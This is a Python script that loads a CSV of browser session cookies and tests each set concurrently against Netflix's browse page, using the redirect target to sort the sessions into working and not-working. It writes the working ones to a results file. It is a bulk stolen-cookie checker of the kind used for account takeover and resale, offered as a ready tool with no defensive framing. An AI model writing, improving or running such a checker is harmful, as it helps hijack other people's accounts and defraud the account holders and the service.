import asyncio
import json
import csv
import aiohttp
import sys

# Constants
CSV_FILE = "cookie_sessions_rows.csv"
CONCURRENCY = 20  # increased concurrency
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Upgrade-Insecure-Requests": "1",
}

def read_cookies_from_csv(filename):
    sessions = []
    try:
        with open(filename, mode='r', encoding='utf-8', errors='replace') as csvfile:
            reader = csv.DictReader(csvfile)
            for row in reader:
                sessions.append({
                    "id": row.get("id"),
                    "cookies": row.get("cookies"),
                    "description": row.get("description")
                })
    except Exception as e:
        print(f"Error reading CSV: {e}")
    return sessions

async def validate_cookie(session, session_data):
    try:
        cookies_data = session_data.get('cookies')
        description = session_data.get('description', 'No Description')
        
        if not cookies_data:
            return False, "No cookie data", description

        if isinstance(cookies_data, str):
            try:
                # Handle double quoting issue if present in CSV
                if cookies_data.startswith('"') and cookies_data.endswith('"'):
                     cookies_data = cookies_data[1:-1].replace('""', '"')
                
                cookies_list = json.loads(cookies_data)
            except json.JSONDecodeError:
                return False, "JSON Decode Error", description
        elif isinstance(cookies_data, list):
            cookies_list = cookies_data
        else:
            return False, f"Unexpected type: {type(cookies_data)}", description
        
        # Prepare cookies for aiohttp
        cookie_jar = {}
        for cookie in cookies_list:
             if isinstance(cookie, dict):
                cookie_jar[cookie.get('name')] = cookie.get('value')
             else:
                 pass # Skipping malformed cookie object

        # Make request
        try:
            async with session.get("https://www.netflix.com/browse", cookies=cookie_jar, headers=HEADERS, timeout=15, allow_redirects=True) as response:
                final_url = str(response.url)
                
                if "/browse" in final_url:
                    return True, "Active (/browse)", description
                elif "/login" in final_url:
                    return False, "Redirected to login", description
                elif "/YourAccount" in final_url:
                    return True, "Active (/YourAccount)", description
                elif "/member" in final_url:
                    return True, "Active (Hold/Member)", description
                elif "/profiles" in final_url:
                    return True, "Active (/profiles)", description
                else:
                    return False, f"Unknown State: {final_url}", description
                
        except Exception as e:
            return False, f"Request Error: {str(e)}", description

    except Exception as e:
        return False, f"Parse Error: {str(e)}", description

async def worker(queue, results):
    async with aiohttp.ClientSession() as session:
        while True:
            item = await queue.get()
            try:
                index, total, data = item
                is_valid, msg, desc = await validate_cookie(session, data)
                
                results.append({
                    "valid": is_valid,
                    "msg": msg,
                    "desc": desc,
                    "data": data
                })
                
                status_color = "\033[92mWORKING\033[0m" if is_valid else "\033[91mNOT WORKING\033[0m"
                print(f"[{index}/{total}] {status_color} {desc[:40]}... : {msg}")
                
            finally:
                queue.task_done()

async def main():
    print(f"Reading cookies from {CSV_FILE}...")
    sessions = read_cookies_from_csv(CSV_FILE)
    if not sessions:
        print("No sessions found or error reading CSV.")
        return

    print(f"Found {len(sessions)} sessions to validate with concurrency {CONCURRENCY}.")
    
    queue = asyncio.Queue()
    results = []
    
    # Enqueue items
    for i, sess in enumerate(sessions):
        queue.put_nowait((i+1, len(sessions), sess))
        
    # Start workers
    workers = []
    for _ in range(CONCURRENCY):
        task = asyncio.create_task(worker(queue, results))
        workers.append(task)
        
    await queue.join()
    
    # Cancel workers
    for task in workers:
        task.cancel()
    await asyncio.gather(*workers, return_exceptions=True)
    
    # Process results
    working = [r for r in results if r['valid']]
    not_working = [r for r in results if not r['valid']]
    
    # Save to files
    with open("csv_working_cookies.txt", "w", encoding="utf-8") as f:
        for w in working:
            f.write(f"{w['desc']} | {w['msg']}\n")
            
    with open("csv_invalid_cookies.txt", "w", encoding="utf-8") as f:
        for nw in not_working:
            f.write(f"{nw['desc']} | {nw['msg']}\n")

    print("=" * 40)
    print(f"Total: {len(sessions)}")
    print(f"Working: {len(working)}")
    print(f"Not Working: {len(not_working)}")
    print("Results saved to 'csv_working_cookies.txt' and 'csv_invalid_cookies.txt'")

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
